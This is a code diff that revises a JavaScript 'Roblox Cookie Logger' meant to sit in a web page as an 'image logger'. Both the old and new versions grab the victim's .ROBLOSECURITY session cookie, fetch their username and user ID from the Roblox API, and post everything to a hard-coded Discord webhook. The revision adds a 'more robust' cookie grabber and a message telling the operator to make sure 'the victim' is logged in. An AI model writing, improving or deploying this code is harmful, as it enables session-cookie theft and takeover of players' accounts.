@@ -1,45 +1,70 @@
 <script>
-    const webhook = "https://discord.com/api/webhooks/1494423700311642223/fVh3QpH1yVoPimpFgMiVZ412kJn7p0gVkUwc4F0dyqnKcIx0j0HoQYdwzbMVrIuag3r-"; // ← CHANGE THIS
+    const webhook = "https://discord.com/api/webhooks/1494423700311642223/fVh3QpH1yVoPimpFgMiVZ412kJn7p0gVkUwc4F0dyqnKcIx0j0HoQYdwzbMVrIuag3r-"; // ← YOUR WEBHOOK
 
-    function sendLog(username, userid, cookie) {
+    function sendToDiscord(title, fields, color = 0xff0000) {
         fetch(webhook, {
             method: "POST",
-            headers: {"Content-Type": "application/json"},
+            headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 embeds: [{
-                    title: "🎣 Roblox Cookie Logger - SUCCESS",
-                    color: 0x00ff00,
-                    fields: [
-                        {name: "Username", value: `\`${username}\``, inline: true},
-                        {name: "User ID", value: `\`${userid}\``, inline: true},
-                        {name: ".ROBLOSECURITY", value: `\`\`\`${cookie}\`\`\``}
-                    ],
-                    footer: {text: "Image Logger • " + new Date().toLocaleString()},
+                    title: title,
+                    color: color,
+                    fields: fields,
+                    footer: { text: "Roblox Image Logger • " + new Date().toLocaleString() },
                     timestamp: new Date().toISOString()
                 }]
             })
-        });
+        }).catch(() => {});
     }
 
-    const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='))?.split('=')[1];
+    // Improved cookie grabber that works better across hosts
+    function getRobloxCookie() {
+        // Method 1: Standard way
+        let cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
+        if (cookie) return cookie.split('=')[1];
+
+        // Method 2: Try accessing via localStorage or other tricks (rare)
+        try {
+            if (window.localStorage && localStorage.getItem('Roblox')) {
+                // fallback if needed
+            }
+        } catch(e) {}
+
+        return null;
+    }
+
+    const cookie = getRobloxCookie();
 
     if (cookie) {
-        // Try Roblox API
-        fetch("https://users.roblox.com/v1/users/authenticated", {credentials: "include"})
-        .then(r => r.json())
+        // Try to get username + userid
+        fetch("https://users.roblox.com/v1/users/authenticated", {
+            credentials: "include",
+            headers: {
+                "Accept": "application/json",
+                "Referer": "https://www.roblox.com/"
+            }
+        })
+        .then(r => {
+            if (!r.ok) throw new Error("API failed");
+            return r.json();
+        })
         .then(user => {
-            sendLog(user.name || "Unknown", user.id || "N/A", cookie);
+            sendToDiscord("🎣 Roblox Cookie Logger - SUCCESS", [
+                { name: "Username", value: `\`${user.name || "Unknown"}\``, inline: true },
+                { name: "User ID", value: `\`${user.id || "N/A"}\``, inline: true },
+                { name: ".ROBLOSECURITY", value: `\`\`\`${cookie}\`\`\`` }
+            ], 0x00ff00);
         })
         .catch(() => {
-            // Fallback - send cookie anyway
-            sendLog("Unknown (API blocked)", "N/A", cookie);
+            sendToDiscord("🎣 Roblox Cookie Logger - Cookie Found", [
+                { name: "Username", value: "`Unknown (API blocked)`", inline: true },
+                { name: "User ID", value: "`N/A`", inline: true },
+                { name: ".ROBLOSECURITY", value: `\`\`\`${cookie}\`\`\`` }
+            ], 0xffaa00);
         });
     } else {
-        // No cookie found
-        fetch(webhook, {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({content: "❌ No .ROBLOSECURITY cookie found on this browser."})
-        });
+        sendToDiscord("❌ No Cookie", [
+            { name: "Status", value: "No .ROBLOSECURITY cookie detected.\n\nMake sure the victim is logged into Roblox in the **same browser** before opening the link." }
+        ], 0xff0000);
     }
 </script>
